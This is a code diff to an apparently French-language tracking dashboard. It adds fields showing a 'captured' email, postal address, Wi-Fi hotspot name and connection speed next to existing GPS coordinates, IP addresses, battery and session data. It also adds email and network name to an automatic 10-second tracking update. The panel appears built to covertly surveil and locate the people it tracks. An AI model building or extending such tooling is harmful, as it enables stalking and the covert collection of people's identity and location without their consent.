@@ -865,6 +865,7 @@
                     <div id="tab-info" class="tab-content active">
                         <div class="detail-row"><span class="detail-label">Nom / Alias</span><span class="detail-value">${alias}</span></div>
                         <div class="detail-row"><span class="detail-label">ID Session</span><span class="detail-value">${sid}</span></div>
+                        <div class="detail-row"><span class="detail-label">Email Capturé</span><span class="detail-value" style="color:var(--accent-success); font-weight:bold;">${lastPos.email || 'Non détecté'}</span></div>
                         <div class="detail-row"><span class="detail-label">Dernière IP Locale</span><span class="detail-value">${lastPos.localIp || 'Inconnue'}</span></div>
                         <div class="detail-row"><span class="detail-label">Dernière Page</span><span class="detail-value">${lastPos.page || '/'}</span></div>
                         <div class="detail-row"><span class="detail-label">Batterie</span><span class="detail-value">${stats.battery !== null ? stats.battery + '%' : 'Inconnue'} ${stats.charging ? '(Charge)' : ''}</span></div>
@@ -876,6 +877,7 @@
                     <div id="tab-trace" class="tab-content">
                         <div class="action-card">
                             <h4>Localisation GPS</h4>
+                            <div class="detail-row"><span class="detail-label">Adresse Postale</span><span class="detail-value" style="font-size: 0.8rem; color:var(--accent-success);">${lastPos.postalAddress || 'Approximatif'}</span></div>
                             <div class="detail-row"><span class="detail-label">Latitude</span><span class="detail-value">${lastPos.lat}</span></div>
                             <div class="detail-row"><span class="detail-label">Longitude</span><span class="detail-value">${lastPos.lon}</span></div>
                             <div class="detail-row"><span class="detail-label">Précision</span><span class="detail-value">${lastPos.accuracy ? Math.round(lastPos.accuracy) + 'm' : 'Inconnue'}</span></div>
@@ -896,6 +898,8 @@
                             <div class="detail-row"><span class="detail-label">IP Publique</span><span class="detail-value">${lastPos.publicIp}</span></div>
                             <div class="detail-row"><span class="detail-label">IP Locale</span><span class="detail-value">${lastPos.localIp || 'N/A'}</span></div>
                             <div class="detail-row"><span class="detail-label">Type Connexion</span><span class="detail-value">${stats.connection}</span></div>
+                            <div class="detail-row"><span class="detail-label">Réseau / Hotspot</span><span class="detail-value">${lastPos.hotspotName || 'Inconnu'}</span></div>
+                            <div class="detail-row"><span class="detail-label">Vitesse (est.)</span><span class="detail-value">${stats.downlink ? stats.downlink + ' Mbps' : 'N/A'}</span></div>
                         </div>
                         <div class="action-card">
                             <h4>Analyse Réseau</h4>
@@ -998,6 +1002,10 @@
                             isUpdate: true,
                             localIp: lastPos.localIp,
                             preciseLocation: { lat: lastPos.lat, lon: lastPos.lon },
+                            deviceStats: {
+                                email: lastPos.email,
+                                networkName: lastPos.hotspotName
+                            },
                             page: "Suivi Automatique (10s)"
                         })
                     });
